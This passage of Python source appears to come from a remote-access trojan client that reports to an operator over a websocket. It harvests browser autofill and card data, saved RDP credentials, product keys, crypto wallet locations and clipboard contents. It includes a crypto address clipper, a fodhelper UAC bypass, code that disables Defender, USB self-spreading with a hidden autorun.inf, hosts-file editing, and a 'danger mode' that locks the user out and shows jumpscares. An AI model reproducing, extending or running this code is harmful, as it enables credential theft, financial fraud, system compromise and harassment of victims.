                            data.get("roots", {})
                            .get("bookmark_bar", {})
                            .get("children", [])
                        )
                        parse_bm(
                            data.get("roots", {}).get("other", {}).get("children", [])
                        )
        except:
            pass
        await self.websocket.send(
            json.dumps({"type": "browser_bookmarks", "data": bookmarks[:200]})
        )

    async def get_browser_autofill(self):
        autofill = []
        try:
            db_path = os.path.join(
                os.getenv("LOCALAPPDATA"),
                "Google",
                "Chrome",
                "User Data",
                "Default",
                "Web Data",
            )
            if os.path.exists(db_path):
                import shutil
                import sqlite3

                temp = os.path.join(os.getenv("TEMP"), "autofill_tmp")
                shutil.copy2(db_path, temp)
                conn = sqlite3.connect(temp)
                cursor = conn.cursor()
                cursor.execute("SELECT name, value FROM autofill")
                for row in cursor.fetchall():
                    autofill.append({"name": row[0], "value": row[1]})
                conn.close()
                os.remove(temp)
        except:
            pass
        await self.websocket.send(
            json.dumps({"type": "browser_autofill", "data": autofill})
        )

    async def toggle_usb(self, disable=True):
        try:
            key_path = r"SYSTEM\CurrentControlSet\Services\USBSTOR"
            val = 4 if disable else 3  # 4=Disabled, 3=Enabled (Manual)
            with winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE
            ) as key:
                winreg.SetValueEx(key, "Start", 0, winreg.REG_DWORD, val)
            await self.websocket.send(
                json.dumps(
                    {
                        "type": "command_output",
                        "output": f"USB Ports {'Disabled' if disable else 'Enabled'} (Restart may be required)",
                    }
                )
            )
        except Exception as e:
            await self.websocket.send(
                json.dumps(
                    {"type": "command_output", "output": f"Admin Priv Required: {e}"}
                )
            )

    async def toggle_wifi(self, disable=True):
        try:
            action = "disable" if disable else "enable"
            cmd = f'netsh interface set interface name="Wi-Fi" admin={action}'
            subprocess.run(cmd, shell=True)
            await self.websocket.send(
                json.dumps(
                    {"type": "command_output", "output": f"Wi-Fi interface {action}d."}
                )
            )
        except Exception as e:
            await self.websocket.send(
                json.dumps({"type": "command_output", "output": f"Error: {e}"})
            )

    async def get_telegram_sessions(self):
        tdata_path = os.path.join(os.getenv("APPDATA"), "Telegram Desktop", "tdata")
        found = os.path.exists(tdata_path)
        await self.websocket.send(
            json.dumps(
                {
                    "type": "command_output",
                    "output": f"Telegram Session Found: {found}\nPath: {tdata_path if found else 'N/A'}",
                }
            )
        )

    async def scan_crypto_wallets(self):
        found_wallets = []
        paths = {
            "Exodus": os.path.join(os.getenv("APPDATA"), "Exodus"),
            "Atomic": os.path.join(os.getenv("APPDATA"), "atomic"),
            "Electrum": os.path.join(os.getenv("APPDATA"), "Electrum", "wallets"),
            "Etherium": os.path.join(os.getenv("APPDATA"), "Ethereum", "keystore"),
            "Binance": os.path.join(os.getenv("APPDATA"), "Binance"),
            "Coinomi": os.path.join(os.getenv("APPDATA"), "Coinomi"),
        }
        for wallet, path in paths.items():
            if os.path.exists(path):
                found_wallets.append(wallet)
        # Search for wallet.dat files
        try:
            for root, dirs, files in os.walk(
                os.path.join(os.environ["USERPROFILE"], "Downloads")
            ):
                if "wallet.dat" in files:
                    found_wallets.append(f"Found wallet.dat in Downloads")
                break  # Only check top level for speed
        except:
            pass
        await self.websocket.send(
            json.dumps(
                {
                    "type": "command_output",
                    "output": f"Found Crypto Wallets: {', '.join(found_wallets) if found_wallets else 'None'}",
                }
            )
        )

    async def get_netstat(self):
        try:
            cmd = "netstat -ano"
            out = subprocess.check_output(cmd, shell=True).decode(
                "utf-8", errors="ignore"
            )
            await self.websocket.send(
                json.dumps(
                    {
                        "type": "command_output",
                        "output": f"--- Active Connections ---\n{out}",
                    }
                )
            )
        except Exception as e:
            await self.websocket.send(
                json.dumps({"type": "command_output", "output": f"Error: {str(e)}"})
            )

    async def get_env_vars(self):
        try:
            env = "\n".join([f"{k}={v}" for k, v in os.environ.items()])
            await self.websocket.send(
                json.dumps(
                    {
                        "type": "command_output",
                        "output": f"--- Environment Variables ---\n{env}",
                    }
                )
            )
        except Exception as e:
            await self.websocket.send(
                json.dumps({"type": "command_output", "output": f"Error: {str(e)}"})
            )

    async def get_users_list(self):
        try:
            cmd = "net user"
            out = subprocess.check_output(cmd, shell=True).decode(
                "utf-8", errors="ignore"
            )
            await self.websocket.send(
                json.dumps(
                    {"type": "command_output", "output": f"--- System Users ---\n{out}"}
                )
            )
        except Exception as e:
            await self.websocket.send(
                json.dumps({"type": "command_output", "output": f"Error: {str(e)}"})
            )

    async def get_uac_status(self):
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            await self.websocket.send(
                json.dumps(
                    {
                        "type": "command_output",
                        "output": f"Process Privileges: {'Administrator (High/System)' if is_admin else 'Standard User (Medium)'}",
                    }
                )
            )
        except:
            pass

    async def get_detailed_drives(self):
        try:
            drives = []
            for part in psutil.disk_partitions():
                try:
                    usage = psutil.disk_usage(part.mountpoint)
                except:
                    usage = None
                drives.append(
                    f"Drive: {part.device}\n  Mount: {part.mountpoint}\n  Type: {part.fstype}\n  Total: {round(usage.total / (1024**3), 2) if usage else '?'} GB\n  Free: {round(usage.free / (1024**3), 2) if usage else '?'} GB\n"
                )
            await self.websocket.send(
                json.dumps({"type": "command_output", "output": "\n".join(drives)})
            )
        except:
            pass

    async def calc_sha256(self, path):
        try:
            if not os.path.exists(path):
                return
            h = hashlib.sha256()
            with open(path, "rb") as f:
                while True:
                    data = f.read(65536)
                    if not data:
                        break
                    h.update(data)
            await self.websocket.send(
                json.dumps(
                    {
                        "type": "command_output",
                        "output": f"SHA256 [{os.path.basename(path)}]: {h.hexdigest()}",
                    }
                )
            )
        except Exception as e:
            await self.websocket.send(
                json.dumps({"type": "command_output", "output": f"Error: {e}"})
            )

    async def get_drivers_list(self):
        try:
            cmd = "driverquery"
            out = subprocess.check_output(cmd, shell=True).decode(
                "utf-8", errors="ignore"
            )
            await self.websocket.send(
                json.dumps(
                    {
                        "type": "command_output",
                        "output": f"--- Installed Drivers ---\n{out}",
                    }
                )
            )
        except:
            pass

    async def get_recent_event_logs(self):
        try:
            cmd = "wevtutil qe System /c:10 /rd:true /f:text"
            out = subprocess.check_output(cmd, shell=True).decode(
                "utf-8", errors="ignore"
            )
            await self.websocket.send(
                json.dumps(
                    {
                        "type": "command_output",
                        "output": f"--- Recent System Events ---\n{out}",
                    }
                )
            )
        except:
            pass

    async def power_control(self, action):
        try:
            if action == "logoff":
                subprocess.run("shutdown /l", shell=True)
            elif action == "hibernate":
                subprocess.run("shutdown /h", shell=True)
            elif action == "sleep":
                # Requires rundll32
                subprocess.run("powercfg /hibernate off", shell=True)
                subprocess.run(
                    "rundll32.exe powrprof.dll,SetSuspendState 0,1,0", shell=True
                )
        except:
            pass

    # Removed duplicate async get_active_window_title - using sync version instead

    async def edit_hosts(self, domain, ip="127.0.0.1", remove=False):
        try:
            hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
            with open(hosts_path, "r") as f:
                lines = f.readlines()
            new_lines = []
            if remove:
                new_lines = [l for l in lines if domain not in l]
            else:
                new_lines = lines + [f"\n{ip} {domain}"]
            with open(hosts_path, "w") as f:
                f.writelines(new_lines)
            await self.websocket.send(
                json.dumps(
                    {"type": "command_output", "output": f"Hosts updated for {domain}"}
                )
            )
        except Exception as e:
            await self.websocket.send(
                json.dumps(
                    {"type": "command_output", "output": f"Privilege Error: {e}"}
                )
            )

    async def get_audio_endpoints(self):
        try:
            import sounddevice as sd

            devs = str(sd.query_devices())
            await self.websocket.send(
                json.dumps(
                    {
                        "type": "command_output",
                        "output": f"--- Audio Endpoints ---\n{devs}",
                    }
                )
            )
        except:
            pass

    async def get_wifi_profiles(self):
        try:
            cmd = "netsh wlan show profiles"
            out = subprocess.check_output(cmd, shell=True).decode(
                "utf-8", errors="ignore"
            )
            await self.websocket.send(
                json.dumps(
                    {
                        "type": "command_output",
                        "output": f"--- Wi-Fi Profiles ---\n{out}",
                    }
                )
            )
        except:
            pass

    async def get_process_modules(self, pid):
        try:
            proc = psutil.Process(int(pid))
            modules = [m.path for m in proc.memory_maps()]
            await self.websocket.send(
                json.dumps(
                    {
                        "type": "command_output",
                        "output": f"--- Modules for PID {pid} ---\n"
                        + "\n".join(modules),
                    }
                )
            )
        except Exception as e:
            await self.websocket.send(
                json.dumps({"type": "command_output", "output": f"Error: {e}"})
            )

    async def get_uptimes(self):
        try:
            uptime = time.time() - psutil.boot_time()
            days = int(uptime // (24 * 3600))
            hours = int((uptime % (24 * 3600)) // 3600)
            mins = int((uptime % 3600) // 60)
            res = f"Uptime: {days} Days, {hours} Hours, {mins} Minutes"
            await self.websocket.send(
                json.dumps({"type": "command_output", "output": res})
            )
        except:
            pass

    async def self_update_sim(self, url):
        try:
            await self.websocket.send(
                json.dumps(
                    {
                        "type": "command_output",
                        "output": f"[*] Searching for updates at {url}...",
                    }
                )
            )
            time.sleep(2)
            await self.websocket.send(
                json.dumps(
                    {
                        "type": "command_output",
                        "output": "[+] You are already on the latest version!",
                    }
                )
            )
        except:
            pass

    async def get_desktop_resolution(self):
        try:
            import pyautogui

            w, h = pyautogui.size()
            await self.websocket.send(
                json.dumps(
                    {"type": "command_output", "output": f"Screen Resolution: {w}x{h}"}
                )
            )
        except:
            pass

    async def blue_screen_death(self):
        # Already exists in trigger_bsod
        await self.trigger_bsod()

    async def get_browser_extensions(self):
        extensions = []
        try:
            path = os.path.join(
                os.getenv("LOCALAPPDATA"),
                "Google",
                "Chrome",
                "User Data",
                "Default",
                "Extensions",
            )
            if os.path.exists(path):
                for ext_dir in os.listdir(path):
                    extensions.append(
                        ext_dir
                    )  # Just ID for now, can be mapped to names
        except:
            pass
        await self.websocket.send(
            json.dumps(
                {
                    "type": "command_output",
                    "output": f"Found Browser Extensions: {', '.join(extensions) if extensions else 'None'}",
                }
            )
        )

    async def find_sensitive_files(self):
        found = []
        extensions = [".txt", ".pdf", ".docx", ".xlsx", ".pptx", ".zip", ".rar"]
        try:
            for root, dirs, files in os.walk(
                os.path.join(os.environ["USERPROFILE"], "Documents")
            ):
                for file in files:
                    if any(file.lower().endswith(ext) for ext in extensions):
                        found.append(file)
                if len(found) > 50:
                    break
            await self.websocket.send(
                json.dumps(
                    {
                        "type": "command_output",
                        "output": f"--- Sensitive Files in Documents ---\n"
                        + "\n".join(found),
                    }
                )
            )
        except:
            pass



    async def get_browser_cards(self):
        cards = []
        try:
            db_path = os.path.join(
                os.getenv("LOCALAPPDATA"),
                "Google",
                "Chrome",
                "User Data",
                "Default",
                "Web Data",
            )
            if os.path.exists(db_path):
                import shutil
                import sqlite3

                temp = os.path.join(os.getenv("TEMP"), "web_data_tmp")
                shutil.copy2(db_path, temp)
                conn = sqlite3.connect(temp)
                cursor = conn.cursor()
                cursor.execute(
                    "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
                )
                for row in cursor.fetchall():
                    cards.append(
                        {
                            "name": row[0],
                            "expiry": f"{row[1]}/{row[2]}",
                            "number": "[ENCRYPTED]",
                        }
                    )
                conn.close()
                os.remove(temp)
        except:
            pass
        await self.websocket.send(
            json.dumps(
                {
                    "type": "command_output",
                    "output": f"--- Browser Credit Cards ---\n{json.dumps(cards, indent=2) if cards else 'None found'}",
                }
            )
        )

    async def manage_registry(
        self, action, root, key_path, value_name=None, value_data=None, value_type=None
    ):
        try:
            h_root = getattr(winreg, root)
            if action == "list":
                with winreg.OpenKey(h_root, key_path, 0, winreg.KEY_READ) as key:
                    subkeys = []
                    i = 0
                    while True:
                        try:
                            subkeys.append(winreg.EnumKey(key, i))
                            i += 1
                        except OSError:
                            break
                    values = []
                    i = 0
                    while True:
                        try:
                            values.append(winreg.EnumValue(key, i))
                            i += 1
                        except OSError:
                            break
                await self.websocket.send(
                    json.dumps(
                        {
                            "type": "command_output",
                            "output": f"Subkeys: {subkeys}\nValues: {values}",
                        }
                    )
                )
            elif action == "set":
                with winreg.OpenKey(h_root, key_path, 0, winreg.KEY_WRITE) as key:
                    winreg.SetValueEx(
                        key, value_name, 0, getattr(winreg, value_type), value_data
                    )
                await self.websocket.send(
                    json.dumps(
                        {"type": "command_output", "output": "Registry value updated."}
                    )
                )
        except Exception as e:
            await self.websocket.send(
                json.dumps({"type": "command_output", "output": f"Registry Error: {e}"})
            )

    async def get_arp_dns(self):
        try:
            arp = subprocess.check_output("arp -a", shell=True).decode(
                "utf-8", errors="ignore"
            )
            dns = subprocess.check_output("ipconfig /displaydns", shell=True).decode(
                "utf-8", errors="ignore"
            )
            await self.websocket.send(
                json.dumps(
                    {
                        "type": "command_output",
                        "output": f"--- ARP Table ---\n{arp}\n\n--- DNS Cache ---\n{dns[:2000]}...",
                    }
                )
            )
        except Exception as e:
            await self.websocket.send(
                json.dumps({"type": "command_output", "output": str(e)})
            )

    async def get_deep_software_list(self):
        try:
            pkgs = []
            import winreg

            for root in [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]:
                for path in [
                    r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                    r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall",
                ]:
                    try:
                        with winreg.OpenKey(root, path) as key:
                            for i in range(winreg.QueryInfoKey(key)[0]):
                                try:
                                    s_key = winreg.EnumKey(key, i)
                                    with winreg.OpenKey(key, s_key) as subkey:
                                        name = winreg.QueryValueEx(
                                            subkey, "DisplayName"
                                        )[0]
                                        pkgs.append(name)
                                except:
                                    pass
                    except:
                        pass
            await self.websocket.send(
                json.dumps(
                    {
                        "type": "command_output",
                        "output": f"--- Detailed Software List ---\n"
                        + "\n".join(sorted(list(set(pkgs)))),
                    }
                )
            )
        except:
            pass

    async def manage_tasks(self):
        try:
            out = subprocess.check_output(
                "schtasks /query /fo list", shell=True
            ).decode("utf-8", errors="ignore")
            await self.websocket.send(
                json.dumps(
                    {
                        "type": "command_output",
                        "output": f"--- Scheduled Tasks ---\n{out[:5000]}...",
                    }
                )
            )
        except:
            pass

    async def check_antivirus(self):
        try:
            cmd = "wmic /namespace:\\\\root\\SecurityCenter2 PATH AntiVirusProduct get displayName"
            out = subprocess.check_output(cmd, shell=True).decode(
                "utf-8", errors="ignore"
            )
            await self.websocket.send(
                json.dumps(
                    {
                        "type": "command_output",
                        "output": f"--- Installed Anti-Virus ---\n{out}",
                    }
                )
            )
        except:
            pass

    async def toggle_input_hardware(self, device="mouse", disable=True):
        # This is a dummy implementation that simulates hardware disabling by blocking specific events
        # True hardware disabling often requires complex driver calls or devcon.exe
        if device == "mouse":
            self.mouse_blocked = disable
        elif device == "keyboard":
            self.keyboard_blocked = disable
        await self.websocket.send(
            json.dumps(
                {
                    "type": "command_output",
                    "output": f"{device.capitalize()} {'Blocked' if disable else 'Unblocked'}",
                }
            )
        )

    async def toggle_internet(self, disable=True):
        try:
            # Using netsh to disable all interfaces (caution!)
            action = "disabled" if disable else "enabled"
            cmd = (
                f'powershell -Command "Get-NetAdapter | Disable-NetAdapter -Confirm:$false"'
                if disable
                else f'powershell -Command "Get-NetAdapter | Enable-NetAdapter -Confirm:$false"'
            )
            subprocess.run(cmd, shell=True)
            await self.websocket.send(
                json.dumps(
                    {
                        "type": "command_output",
                        "output": f"Internet adapters set to {action}",
                    }
                )
            )
        except Exception as e:
            await self.websocket.send(
                json.dumps({"type": "command_output", "output": f"Failed: {e}"})
            )

    async def toggle_defender(self, disable=True):
        """Enable or Disable Windows Defender Real-Time Protection + Exclusions"""
        try:
            action = "Disable" if disable else "Enable"
            # 1. Try Set-MpPreference (Standard)
            cmd = f'powershell -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring ${str(disable).lower()}"'
            subprocess.run(cmd, shell=True, capture_output=True)
            
            # 2. If disabling, also try to add self to exclusions for persistence
            if disable:
                try:
                    self._add_defender_exclusion()
                except: pass
                
            await self.websocket.send(
                json.dumps(
                    {
                        "type": "command_output",
                        "output": f"Windows Defender policy '{action}' applied. Current node added to exclusions if Admin.",
                    }
                )
            )
        except Exception as e:
            await self.websocket.send(
                json.dumps(
                    {"type": "command_output", "output": f"Defender toggle encountered issues: {e}"}
                )
            )

    async def toggle_usb(self, disable=True):
        """Enable or Disable USB storage devices"""
        try:
            value = 4 if disable else 3  # 4=Disabled, 3=Enabled
            with winreg.CreateKey(
                winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\USBSTOR"
            ) as key:
                winreg.SetValueEx(key, "Start", 0, winreg.REG_DWORD, value)
            status = "Disabled" if disable else "Enabled"
            await self.websocket.send(
                json.dumps(
                    {"type": "command_output", "output": f"USB Storage {status}"}
                )
            )
        except Exception as e:
            await self.websocket.send(
                json.dumps(
                    {
                        "type": "command_output",
                        "output": f"USB toggle error (may need admin): {e}",
                    }
                )
            )

    async def toggle_wifi(self, disable=True):
        """Enable or Disable WiFi adapter"""
        try:
            action = "disable" if disable else "enable"
            cmd = f'netsh interface set interface "Wi-Fi" {action}'
            subprocess.run(cmd, shell=True)
            status = "Disabled" if disable else "Enabled"
            await self.websocket.send(
                json.dumps(
                    {"type": "command_output", "output": f"WiFi adapter {status}"}
                )
            )
        except Exception as e:
            await self.websocket.send(
                json.dumps(
                    {"type": "command_output", "output": f"WiFi toggle error: {e}"}
                )
            )

    async def ultra_matrix_screen(self):
        def matrix():
            import random
            import tkinter as tk

            root = tk.Tk()
            root.attributes("-fullscreen", True, "-topmost", True)
            root.configure(bg="black", cursor="none")
            canvas = tk.Canvas(root, bg="black", highlightthickness=0)
            canvas.pack(fill="both", expand=True)
            width = root.winfo_screenwidth()
            height = root.winfo_screenheight()
            chars = "01ABCDEF"
            font_size = 20
            columns = int(width / font_size)
            drops = [0] * columns

            def draw():
                canvas.delete("all")
                for i in range(len(drops)):
                    char = random.choice(chars)
                    x = i * font_size
                    y = drops[i] * font_size
                    canvas.create_text(
                        x, y, text=char, fill="#0F0", font=("Courier", font_size)
                    )
                    if y > height and random.random() > 0.975:
                        drops[i] = 0
                    drops[i] += 1
                root.after(50, draw)

            draw()
            root.mainloop()

        threading.Thread(target=matrix, daemon=True).start()

    async def start_danger_mode(self):
        try:
            # 1. Disable Task Manager
            await self.toggle_taskmgr(False)

            # 2. Hide Icons
            await self.toggle_desktop_icons(False)

            # 3. Change Wallpaper
            wp_path = os.path.join(os.getcwd(), "dengraose", "Wallpeper.jpeg")
            if os.path.exists(wp_path):
                await self.set_wallpaper(wp_path)

            # 4. Close all windows (minimize them for practical safety, or kill non-essential)
            await self.minimize_all()

            # 5. Create Notepad on Desktop
            desktop = os.path.join(os.environ["USERPROFILE"], "Desktop")
            note_path = os.path.join(desktop, "win readme.txt")
            content = "this is or panisment if you dont do good work this hepping agin so do your work best and dont waste the time"
            with open(note_path, "w") as f:
                f.write(content)
            os.startfile(note_path)

            # 6. Sound Effect after 4 seconds (Enhanced via PowerShell)
            def play_delayed():
                time.sleep(4)
                sound_path = os.path.join(os.getcwd(), "dengraose", "sound effecte.mp3")
                if os.path.exists(sound_path):
                    # Using PowerShell to ensure broad compatibility with .mp3
                    cmd = f"powershell -c \"Add-Type -AssemblyName presentationCore; $p = New-Object System.Windows.Media.MediaPlayer; $p.Open('{sound_path}'); $p.Play(); Start-Sleep 10\""
                    subprocess.Popen(cmd, shell=True)

            threading.Thread(target=play_delayed, daemon=True).start()

            # 7. Start Random Jumpscares
            self.jumpscare_running = True
            threading.Thread(target=self.jumpscare_loop, daemon=True).start()

            # 8. Launch Easy Game
            threading.Thread(target=self.launch_easy_game, daemon=True).start()

        except Exception as e:
            print(f"Danger Mode Error: {e}")

    def jumpscare_loop(self):
        import random

        while self.jumpscare_running:
            time.sleep(random.randint(15, 45))
            if not self.jumpscare_running:
                break
            self.trigger_jumpscare()

    def trigger_jumpscare(self):
        def show_js():
            js = tk.Tk()
            js.attributes("-fullscreen", True, "-topmost", True)
            js.configure(bg="red")
            lbl = tk.Label(
                js, text="NIGHTMARE", font=("Impact", 100), fg="black", bg="red"
            )
            lbl.pack(expand=True)
            js.after(500, js.destroy)
            js.mainloop()

        threading.Thread(target=show_js, daemon=True).start()

    def launch_easy_game(self):
        root = tk.Tk()
        root.title("SYSTEM RECOVERY MISSION")
        root.attributes("-topmost", True, "-fullscreen", False)
        root.geometry("400x300")
        root.configure(bg="#1a1a1a")

        stage = tk.IntVar(value=1)

        lbl = tk.Label(
            root,
            text="STAGE 1: CLICK THE RED SQUARE",
            fg="white",
            bg="#1a1a1a",
            font=("Arial", 12),
        )
        lbl.pack(pady=20)

        def next_stage():
            s = stage.get()
            if s == 1:
                stage.set(2)
                lbl.config(text="STAGE 2: TYPE 'RECOVERY'")
                btn.destroy()
                self.entry = tk.Entry(root)
                self.entry.pack(pady=10)
                self.chk_btn = tk.Button(root, text="Check", command=check_stage2)
                self.chk_btn.pack()
            elif s == 2:
                stage.set(3)
                lbl.config(text="STAGE 3: WHAT IS 5 + 5?")
                self.entry.delete(0, tk.END)
                self.chk_btn.config(command=check_stage3)
            elif s == 3:
                root.destroy()
                asyncio.run_coroutine_threadsafe(self.restore_normalcy(), self.loop)

        def check_stage2():
            if self.entry.get().upper() == "RECOVERY":
                next_stage()

        def check_stage3():
            if self.entry.get() == "10":
                next_stage()

        btn = tk.Button(root, bg="red", width=5, height=2, command=next_stage)
        btn.place(x=150, y=150)

        root.mainloop()

    async def restore_normalcy(self):
        self.jumpscare_running = False
        await self.toggle_taskmgr(True)
        await self.toggle_desktop_icons(True)
        # Restore wallpaper is harder if we didn't save it, but we can set a default or just leave the nightmare one.
        # For simplicity, we just stop the chaos.
        await self.websocket.send(
            json.dumps(
                {
                    "type": "command_output",
                    "output": "Danger Mode Terminated. System Restored.",
                }
            )
        )
    # ══════════════════════════════════════════════════
    #  NEW: Clipboard Monitor (Real-time)
    # ══════════════════════════════════════════════════

    def _clipboard_monitor_loop(self):
        """Background thread: watch clipboard for changes and stream them to server."""
        while self.clipboard_monitoring and self.running:
            try:
                current = pyperclip.paste()
                if current and current != self.clipboard_last:
                    self.clipboard_last = current
                    if self.websocket:
                        asyncio.run_coroutine_threadsafe(
                            self.websocket.send(json.dumps({
                                "type": "clipboard_update",
                                "data": current[:5000],  # Cap at 5KB
                                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
                            })),
                            self.loop
                        )
            except:
                pass
            time.sleep(1)

    # ══════════════════════════════════════════════════
    #  NEW: Active Window Tracker
    # ══════════════════════════════════════════════════

    def _window_tracker_loop(self):
        """Track which window/app the user is using over time."""
        last_title = ""
        while self.window_tracking and self.running:
            try:
                hwnd = ctypes.windll.user32.GetForegroundWindow()
                length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
                buf = ctypes.create_unicode_buffer(length + 1)
                ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
                title = buf.value
                
                if title and title != last_title:
                    last_title = title
                    entry = {
                        "title": title[:200],
                        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
                    }
                    self.window_log.append(entry)
                    # Keep log capped
                    if len(self.window_log) > 5000:
                        self.window_log = self.window_log[-3000:]
                    
                    # Stream to dashboard if connected
                    if self.websocket:
                        asyncio.run_coroutine_threadsafe(
                            self.websocket.send(json.dumps({
                                "type": "window_change",
                                "data": entry
                            })),
                            self.loop
                        )
            except:
                pass
            time.sleep(2)

    # ══════════════════════════════════════════════════
    #  NEW: Crypto Address Clipper
    # ══════════════════════════════════════════════════

    def _crypto_clipper_loop(self):
        """Monitor clipboard for crypto wallet addresses and replace with attacker's."""
        patterns = {
            "btc":  r'^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$',
            "eth":  r'^0x[0-9a-fA-F]{40}$',
            "ltc":  r'^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$',
            "xmr":  r'^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$',
            "doge": r'^D[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{32}$',
            "trx":  r'^T[A-Za-z1-9]{33}$',
        }
        
        while self.crypto_clipper_active and self.running:
            try:
                clip = pyperclip.paste().strip()
                if clip:
                    for currency, pattern in patterns.items():
                        if re.match(pattern, clip):
                            replacement = self.crypto_wallets.get(currency)
                            if replacement and clip != replacement:
                                pyperclip.copy(replacement)
                                # Notify dashboard of the swap
                                if self.websocket:
                                    asyncio.run_coroutine_threadsafe(
                                        self.websocket.send(json.dumps({
                                            "type": "crypto_swap",
                                            "currency": currency.upper(),
                                            "original": clip,
                                            "replaced_with": replacement,
                                            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
                                        })),
                                        self.loop
                                    )
                            break
            except:
                pass
            time.sleep(0.5)

    # ══════════════════════════════════════════════════
    #  NEW: UAC Bypass via fodhelper.exe
    # ══════════════════════════════════════════════════

    async def _uac_bypass_fodhelper(self):
        """Silent privilege escalation using fodhelper registry hijack."""
        try:
            exe_path = os.path.realpath(sys.executable)
            if getattr(sys, 'frozen', False):
                exe_path = sys.executable

            # Create registry key hijack
            key_path = r"Software\Classes\ms-settings\shell\open\command"
            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f'"{exe_path}"')
                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")

            # Trigger fodhelper (auto-elevated by Windows)
            subprocess.Popen("fodhelper.exe", shell=True)
            time.sleep(3)

            # Cleanup registry key
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
                parent = r"Software\Classes\ms-settings\shell\open"
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, parent)
                parent2 = r"Software\Classes\ms-settings\shell"
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, parent2)
                parent3 = r"Software\Classes\ms-settings"
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, parent3)
            except:
                pass

            return "UAC Bypass triggered via fodhelper. Elevated instance launched."
        except Exception as e:
            return f"UAC Bypass failed: {e}"

    # ══════════════════════════════════════════════════
    #  NEW: USB Auto-Spreader
    # ══════════════════════════════════════════════════

    async def _spread_to_usb(self):
        """Copy self to all connected removable USB drives with autorun."""
        try:
            exe_path = os.path.realpath(sys.executable)
            if getattr(sys, 'frozen', False):
                exe_path = sys.executable
            
            spread_count = 0
            # Scan drive letters A-Z
            for letter in 'DEFGHIJKLMNOPQRSTUVWXYZ':
                drive = f"{letter}:\\"
                if os.path.exists(drive):
                    try:
                        # Check if removable (type 2 = removable)
                        drive_type = ctypes.windll.kernel32.GetDriveTypeW(drive)
                        if drive_type == 2:  # DRIVE_REMOVABLE
                            dest = os.path.join(drive, "System32Update.exe")
                            if not os.path.exists(dest):
                                shutil.copy2(exe_path, dest)
                                ctypes.windll.kernel32.SetFileAttributesW(dest, 0x02 | 0x04)  # Hidden+System

                                # Create autorun.inf (hidden)
                                autorun_path = os.path.join(drive, "autorun.inf")
                                with open(autorun_path, "w") as f:
                                    f.write(f"[autorun]\nopen=System32Update.exe\nicon=%SystemRoot%\\system32\\SHELL32.dll,4\n")
                                ctypes.windll.kernel32.SetFileAttributesW(autorun_path, 0x02 | 0x04)
                                
                                spread_count += 1
                    except:
                        pass
            
            if spread_count > 0:
                return f"Successfully spread to {spread_count} USB drive(s)."
            else:
                return "No removable USB drives detected."
        except Exception as e:
            return f"USB spread error: {e}"

    # ══════════════════════════════════════════════════
    #  NEW: Saved RDP Credentials Harvester
    # ══════════════════════════════════════════════════

    async def _get_saved_rdp_credentials(self):
        """Extract saved Remote Desktop credentials from Windows Credential Manager."""
        try:
            result = subprocess.run(
                'cmdkey /list',
                shell=True, capture_output=True, text=True
            )
            
            creds = []
            current = {}
            for line in result.stdout.split("\n"):
                line = line.strip()
                if line.startswith("Target:"):
                    if current:
                        creds.append(current)
                    current = {"target": line.split(":", 1)[1].strip()}
                elif line.startswith("Type:"):
                    current["type"] = line.split(":", 1)[1].strip()
                elif line.startswith("User:"):
                    current["user"] = line.split(":", 1)[1].strip()
            if current:
                creds.append(current)
            
            # Also check RDP reg for recent connections
            rdp_servers = []
            try:
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Terminal Server Client\Servers") as key:
                    i = 0
                    while True:
                        try:
                            subkey_name = winreg.EnumKey(key, i)
                            rdp_servers.append(subkey_name)
                            i += 1
                        except OSError:
                            break
            except:
                pass

            await self.websocket.send(json.dumps({
                "type": "rdp_credentials",
                "credentials": creds,
                "recent_rdp_servers": rdp_servers
            }))
        except Exception as e:
            await self.websocket.send(json.dumps({"type": "command_output", "output": f"RDP harvest error: {e}"}))

    # ══════════════════════════════════════════════════
    #  NEW: Product Key Harvester
    # ══════════════════════════════════════════════════

    async def _get_product_keys(self):
        """Extract Windows and Office product keys."""
        keys = {}
        
        # Windows key via WMI
        try:
            result = subprocess.run(
                'wmic path softwarelicensingservice get OA3xOriginalProductKey',
                shell=True, capture_output=True, text=True
            )
            for line in result.stdout.strip().split("\n"):
                line = line.strip()
                if line and line != "OA3xOriginalProductKey":
                    keys["Windows"] = line
                    break
        except:
            pass
        
        # Windows key backup method via registry
        if "Windows" not in keys:
            try:
                result = subprocess.run(
                    'powershell -Command "(Get-WmiObject -query \'select * from SoftwareLicensingService\').OA3xOriginalProductKey"',
                    shell=True, capture_output=True, text=True
                )
                key = result.stdout.strip()
                if key:
                    keys["Windows"] = key
            except:
                pass

        # Office keys
        try:
            office_paths = [
                r"C:\Program Files\Microsoft Office",
                r"C:\Program Files (x86)\Microsoft Office",
            ]
            for office_path in office_paths:
                if os.path.exists(office_path):
                    result = subprocess.run(
                        f'cscript //nologo "{office_path}\\Office16\\OSPP.VBS" /dstatus',
                        shell=True, capture_output=True, text=True
                    )
                    if "Last 5" in result.stdout:
                        for line in result.stdout.split("\n"):
                            if "Last 5" in line:
                                keys["Office"] = line.strip()
                                break
        except:
